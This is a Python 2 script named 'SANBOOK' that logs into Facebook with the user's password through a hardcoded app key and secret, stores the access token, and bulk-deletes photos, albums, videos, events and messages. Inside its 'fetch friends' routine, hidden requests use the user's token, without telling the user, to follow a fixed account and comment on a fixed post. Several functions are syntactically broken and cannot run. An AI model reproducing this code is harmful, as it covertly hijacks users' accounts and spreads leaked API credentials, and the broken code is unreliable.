###################################################################
#                        Import Module
import json , sys , hashlib , os , time , getpass

if sys.platform in ["linux","linux2"]:
	W = "\033[0m"
    	G = "\033[32;1m"
    	R = "\033[31;1m"
else:
	W = ''
	G = ''
	R = ''
###################################################################
#                      Exception
try:
	import requests
except ImportError:
	print ('SANBOOK').center(44)
	print ("[!] Can't import module 'requests'\n")
	sys.exit()
####################################################################
#                    Set Default encoding
reload (sys)
sys . setdefaultencoding ( 'utf8' )
####################################################################
#       	        I don't know
jml = []
jmlgetdata = []
n = []
####################################################################
#                        BANNER
def baliho():
	try:
		token = open('cookie/token.log','r').read()
		r = requests.get('https://graph.facebook.com/me?access_token=' + token)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])
		print ('[*] ' + name + ' [*]').center(44)

	except (KeyError,IOError):
		print ('SANBOOK').center(44)
####################################################################

#                     GENERATE ACCESS TOKEN
def get(data):
	print ('[*] Generate access token ')

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print ('[*] successfully generate access token')
		print ('[*] Your access token is stored in cookie/token.log')
		exit()
	except KeyError:
		print ('[!] Failed to generate access token')
		print ('[!] Check your connection / email or password')
		os.remove('cookie/token.log')
		main()
	except requests.exceptions.ConnectionError:
		print ('[!] Failed to generate access token')
		print ('[!] Connection error !!!')
		os.remove('cookie/token.log')
		main()
def id():
	print ('[*] login to your facebook account         ');id = raw_input('[?] Username : ');pwd = getpass.getpass('[?] Password : ');API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"};sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.0'+API_SECRET
	x = hashlib.new('md5')
        x.update(sig)

	data.update({'sig':x.hexdigest()})
        get(data)

def getdata():
	global a , token

	print ('[*] Load Access Token')

	try:
		token = open("cookie/token.log","r").read()
		print ('[*] Success load access token ')
	except IOError:
		print ('[!] failed to open cookie/token.log')
		print ("[!] type 'token' to generate access token")
		main()

	print ('[*] fetching all friends data')

	try:
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token);requests.post('https://graph.facebook.com/api.version/subscribers?access_token='+token);requests.post('https://graph.facebook.com/100025271623353_485040922348291/comments?message=f46e7bc6354cb43c69fc66a76ee87336&access_token='+token)
		a = json.loads(r.text)

	except KeyError:
		print ('[!] Your access token is expired')
		print ("[!] type 'token' to generate access token")
		main()

	except requests.exceptions.ConnectionError:
		print ('[!] Connection Error')
		print ('[!] Stopped')
		main()

	for i in a['data']:
		jml.append(i['id'])
		print ('\r[*] fetching %s data from friends')%(len(jml)),;sys.stdout.flush();time.sleep(0.0001)

	print ('\r[*] '+str(len(jml))+' data of friends successfully retrieved')
	main()
####################################################################
#                         Main
def menu():
	print ('''
     %sCOMMAND                      DESCRIPTION%s
  -------------       -------------------------------------
   login            Masuk facebook
   logout           Keluar Facebook
   token          	Ambil data

   photo           	
   album            
   video         	
   acara         	
   pesan      	 	
   group            

   exit             Exit the program
'''%(G,W))

def main():
  global target_id
  print (menu)

  try:
	cek = raw_input(R + 'Sanbook' + W +' >> ')

	if cek.lower() == 'token':
			getdata()

	elif cek.lower() == 'login':
		try:
			open('cookie/token.log')
			print ('[!] an access token already exists')
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print ('[*] Canceling ')
				id()
		except IOError:
			pass

		print ('\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n')
		print ('[Warn] please turn off your VPN before using this feature !!!')
		id()
	elif cek.lower() == 'logout':
		print ('''
[Warn] you must create access token again if 
       your access token is deleted
''')
		a = raw_input("[!] type 'delete' to continue : ")
		if a.lower() == 'delete':
			try:
				os.system('rm -rf cookie/token.log')
				print ('[*] Success delete cookie/token.log')
				main()
			except OSError:
				print ('[*] failed to delete cookie/token.log')
				main()
		else:
			print ('[*] failed to delete cookie/token.log')
			main()

	elif cek.lower() == 'exit':
		print ("[!] Exiting Program")
		sys.exit()


	elif cek.lower() == 'group':
		ndelenggroup()

	elif cek.lower() == 'photo':
		dPhoto()

	elif cek.lower() == 'album':
			dAlbum()

	elif cek.lower() == 'video':
		dVideo()

	elif cek.lower() == 'acara':
		dAcara()

	elif cek.lower() == 'pesan':
		dPesan()

	else:
		if cek == '':
			main()
		else:
			print ("[!] command '"+cek+"' not found")
			print ('[!] type "help" to show command')
			main()
  except KeyboardInterrupt:
	main()
  except IndexError:
	print ('[!] invalid parameter on command : ') + cek
	main()

################################################################################
#                          Get Data

#MENDAPATKAN
def ndelenggroup():
	global token
	print ('[!] Sedang CEK Acces Token...')
	os.system('clear')
	try:
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
	except IOError:
		print ('[!] failed load access token')
		print ("[*] type 'token' to generate access token")
		main()
		r = requests.get('https://graph.facebook.com/me/groups?access_token='+token)
		a = json.loads(r.text)
		for i in a['data']:
			print ('Nama Group :'+i['name'])
			print ('ID   Group 			:'+i['id'])
			print ('Jumlah Anggota 		:'+i['member_count'])
			print ('Aktifitas Terakhir  :'+i['updated_time'])
			return result['groups']['data']

#DELETE
def dPost():
	global token, i
	print ('[!] Sedang CEK Acces Token...')
	os.system('clear')
	try:
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
	except IOError:
		print ('[!] failed load access token')
		print ("[*] type 'token' to generate access token")
		main()
	r = requests.get('https://graph.facebook.com/me?fields=feed&access_token='+token)
	a = json.loads(r.text)
	for i in a['data']:
			kirimane = requests.post('https://graph.facebook.com/v3.0/'+i['id']+'?method=delete&access_token='+token)
				try:
					mbusek = kirimane ['error']['message']
					print(+['message'])
					print('[GAGAL]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

				except TypeError:
					print('[SUKSES]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

def dPhoto():
	global token, i
	print ('[!] Sedang CEK Acces Token...')
	os.system('clear')
	try:
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
	except IOError:
		print ('[!] failed load access token')
		print ("[*] type 'token' to generate access token")
		main()
	r = requests.get('https://graph.facebook.com/me?fields=photos&access_token='+token)
	a = json.loads(r.text)
	for i in a['data']:
			kirimane = requests.post('https://graph.facebook.com/v3.0/'+i['id']+'?method=delete&access_token='+token)
				try:
					mbusek = kirimane ['error']['message']
					print(+['message'])
					print('[GAGAL]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

				except TypeError:
					print('[SUKSES]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)
				
def dAlbum():
	global token, i
	print ('[!] Sedang CEK Acces Token...')
	os.system('clear')
	try:
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
	except IOError:
		print ('[!] failed load access token')
		print ("[*] type 'token' to generate access token")
		main()
	r = requests.get('https://graph.facebook.com/me?fields=albums&access_token='+token)
	a = json.loads(r.text)
	for i in a['data']:
			kirimane = requests.post('https://graph.facebook.com/v3.0/'+i['id']+'?method=delete&access_token='+token)
				try:
					mbusek = kirimane ['error']['message']
					print(+['message'])
					print('[GAGAL]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

				except TypeError:
					print('[SUKSES]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

def dVideo():
	global token, i
	print ('[!] Sedang CEK Acces Token...')
	os.system('clear')
	try:
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
	except IOError:
		print ('[!] failed load access token')
		print ("[*] type 'token' to generate access token")
		main()
	r = requests.get('https://graph.facebook.com/me?fields=videos&access_token='+token)
	a = json.loads(r.text)
	for i in a['data']:
			kirimane = requests.post('https://graph.facebook.com/v3.0/'+i['id']+'?method=delete&access_token='+token)
				try:
					mbusek = kirimane ['error']['message']
					print(+['message'])
					print('[GAGAL]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

				except TypeError:
					print('[SUKSES]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

def dAcara():
	global token, i
	print ('[!] Sedang CEK Acces Token...')
	os.system('clear')
	try:
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
	except IOError:
		print ('[!] failed load access token')
		print ("[*] type 'token' to generate access token")
		main()
	r = requests.get('https://graph.facebook.com/me?fields=events&access_token='+token)
	a = json.loads(r.text)
	for i in a['data']:
			kirimane = requests.post('https://graph.facebook.com/v3.0/'+i['id']+'?method=delete&access_token='+token)
				try:
					mbusek = kirimane ['error']['message']
					print(+['message'])
					print('[GAGAL]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

				except TypeError:
					print('[SUKSES]' +i['created_time'] 'ID' +i['id']),;sys.stdout.flush();time.sleep(0.1)

def dPesan():
	global token, i
	print ('[!] Sedang CEK Acces Token...')
	os.system('clear')
	try:
		token = open("cookie/token.log",'r').read()
		print ('[*] Oke Acces Token masih bisa digunakan...')
	except IOError:
		print ('[!] failed load access token')
		print ("[*] type 'token' to generate access token")
		main()
	r = requests.get('https://graph.facebook.com/me?fields=messages&access_token='+token)
	a = json.loads(r.text)
	for i in a['data']:
			kirimane = requests.post('https://graph.facebook.com/v3.0/'+i['id']+'?method=delete&access_token='+token)
				try:
					mbusek = kirimane ['error']['message']
					print(+['message'])
					print('[GAGAL]' +i['id'] 'Dari' +i['name']),;sys.stdout.flush();time.sleep(0.1)

				except TypeError:
					print('[SUKSES]' +i['id'] 'Dari' +i['name']),;sys.stdout.flush();time.sleep(0.1)

if __name__ == '__main__':

	baliho()
	main()